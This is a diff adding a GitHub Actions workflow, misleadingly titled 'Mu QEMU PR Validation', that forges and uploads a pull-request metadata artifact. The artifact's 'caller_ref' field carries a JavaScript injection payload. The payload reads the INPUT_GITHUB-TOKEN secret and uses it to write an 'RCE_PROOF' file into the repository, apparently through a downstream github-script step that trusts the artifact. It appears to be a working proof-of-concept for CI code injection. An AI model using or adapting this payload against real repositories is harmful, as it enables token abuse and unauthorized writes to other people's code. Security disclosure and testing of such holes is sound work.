@@ -1,0 +1,34 @@
+name: Mu QEMU PR Validation
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create forged metadata artifact
+        run: |
+          mkdir -p metadata
+          python3 - <<'PY'
+          import json
+
+          payload = {
+              "pr_number": 1,
+              "head_sha": "",
+              "caller_ref": "';const t=process.env['INPUT_GITHUB-TOKEN']||'';core.info('TOKEN_LEN='+t.length);try{await github.rest.repos.createOrUpdateFileContents({owner:context.repo.owner,repo:context.repo.repo,path:'RCE_PROOF_'+Date.now()+'.md',message:'rce proof',content:Buffer.from('rce').toString('base64')});core.info('WRITE_OK');}catch(e){core.info('WRITE_ERR='+e.message);}//",
+              "caller_repo_name": "mu_plus",
+              "mu_tiano_platforms_sha": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+              "platforms": {},
+              "validation": {"failed": False},
+              "skipped": False,
+              "skip_reason": "",
+          }
+          open('metadata/pr-metadata.json', 'w').write(json.dumps(payload))
+          PY
+
+      - name: Upload forged artifact
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: mu-qemu-pr-metadata
+          path: metadata/pr-metadata.json
